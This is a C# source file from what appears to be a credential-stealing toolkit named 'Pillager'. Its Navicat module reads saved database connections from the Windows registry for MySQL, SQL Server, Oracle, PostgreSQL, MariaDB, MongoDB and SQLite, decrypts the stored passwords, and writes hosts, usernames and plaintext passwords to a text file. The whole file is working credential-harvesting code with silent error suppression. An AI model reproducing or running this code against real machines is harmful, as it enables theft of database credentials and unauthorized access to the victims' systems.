using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.Tools
{
    internal class Navicat : ICommand
    {
        public string DecryptPwd()
        {
            StringBuilder sb = new StringBuilder();
            Navicat11Cipher Decrypt = new Navicat11Cipher();

            var dictionary = new Dictionary<string, string>
            {
                { "Navicat", "MySql" },
                { "NavicatMSSQL", "SQL Server" },
                { "NavicatOra", "Oracle" },
                { "NavicatPG", "pgsql" },
                { "NavicatMARIADB", "MariaDB" },
                { "NavicatMONGODB","MongoDB"},
                { "NavicatSQLite","SQLite"}
            };

            foreach (var key in dictionary.Keys)
            {
                var registryKey = Registry.CurrentUser.OpenSubKey($@"Software\PremiumSoft\{key}\Servers");
                if (registryKey == null) continue;
                sb.AppendLine($"DatabaseName: {dictionary[key]}");

                foreach (string rname in registryKey.GetSubKeyNames())
                {
                    RegistryKey installedapp = registryKey.OpenSubKey(rname);
                    if (installedapp != null)
                    {
                        try
                        {
                            var hostname = installedapp.GetValue("Host").ToString();
                            var username = installedapp.GetValue("UserName").ToString();
                            var password = installedapp.GetValue("Pwd").ToString();

                            sb.AppendLine("ConnectName: " + rname);
                            sb.AppendLine("hostname: " + hostname);
                            sb.AppendLine("ConnectName: " + username);
                            sb.AppendLine("password: " + Decrypt.DecryptString(password));
                            sb.AppendLine();
                        }
                        catch
                        { }
                    }
                }
            }
            return sb.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                var registryKey = Registry.CurrentUser.OpenSubKey(@"Software\PremiumSoft");
                if (registryKey == null) return;
                string savepath = Path.Combine(path, "Navicat");
                Directory.CreateDirectory(savepath);
                string output = DecryptPwd();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "Navicat.txt"), output, Encoding.UTF8);
            }
            catch { }
        }
    }
}
